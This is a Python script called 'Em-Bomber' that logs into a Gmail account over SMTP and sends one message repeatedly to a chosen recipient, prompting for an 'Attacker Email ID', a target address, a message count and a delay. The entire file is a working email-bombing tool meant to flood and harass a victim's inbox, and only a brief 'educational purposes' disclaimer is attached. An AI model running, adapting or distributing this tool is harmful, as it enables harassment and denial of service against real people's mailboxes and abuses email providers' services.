""" Coded by Background-Sajjad (Sajjad) """
#Used smtp protocol.

import smtplib
import getpass
import time
import os
import logo
import sys
#Colour
White="\033[0;0m"
Red="\033[91m"
Green="\033[92m"
Yellow="\033[93m"
Blue="\033[94m"
Cyan="\033[96m"
Bg_red="\033[101m"
Bold="\033[1m"
Clear="\033[0;0;0m"
try:
	print(Red+Bold+"\n This tool is only for educational purposes.")
	print(Yellow+Bold+"\n Em-Bomber starting...",end="\r")
	try:
		email=smtplib.SMTP("smtp.gmail.com",587)
		email.starttls()
	except:
		print(" Unable to start.      ")
		print(Bold+White+Bg_red+"\n Make sure you have internet connection !")
		print(Clear)
		sys.exit()
	
	print(Bold+Green+" Em-Bomber started...")
	time.sleep(1)
	os.system("clear")
#print banar	
	print(logo.logo())
	print(" ")
	user_gmail=input(Cyan+Bold+"\n Attacker Email ID : ")
	user_password=getpass.getpass(Cyan+Bold+"\n Email password : ")
	try:
		email.login(user_gmail,user_password)
	except:
		os.system("clear")
		print(Bold+White+Bg_red+"\n\tMake sure email and password both are correct !")
		print(Clear)
		email.quit()
		sys.exit()
	print(" ")	
	receiver_gmail=input(Bold+Cyan+"\n Receiver Email ID : ")
	print(" ")
	massage=input(Bold+Yellow+"\n Massage: ")
	print(" ")
	amount=input(Bold+Cyan+"\n Number of emails (defaults [1-10]) : ")
	# slep for sleep.
	slep=input("\n Time (seconds) to send per emails (defaults [0]) : ")
	try:
		slep=int(slep)
	except:
		slep=0
	try:
		amount=int(amount)
	except:
		amount=10
	print(" ")
	print(" ")
	time.sleep(1)
	print(Red+Bold+"\n Email bombing attack have been started...")
	print(" ")
	count=0
	fail=0
	tim=time.time()
	while(True):
		count+=1
		try:
			time.sleep(slep)
			email.sendmail(user_gmail,receiver_gmail,massage)
			print(Bold+Green+"\n Sent successfully {}".format(count))
		except:
			fail+=1
			print(Bold+Red+"\n Sent unsuccessfully {}".format(fail))
			
  #Use if,else for two lines
  		#1. Emails successfully sent.
  		#2. Emails sent unsuccessfully.	
		if(count==amount):
			send=count-fail
			print(" ")
			#Time programm.
			print(Bold+Yellow+"\n Completed in {} seconds.".format(time.time()-tim))
			print(" ")
			print(Bold+Blue+"\n Emails successfully sent {}.".format(send))
			print(" ")
			# Use try except in unsent email print text colour.
			if(fail==0):
				Colour=Bold+Green# If all emails sent successfully.
			else:
				Colour=Bold+Red# if an email sent unsuccessfully.
			#Use try , except Colour in this text.
			print(Colour+"\n Emails sent unsuccessfully {}.".format(fail))
			print(White)
			email.quit()
			break
			
except:
			pass
			
			
		
	
		





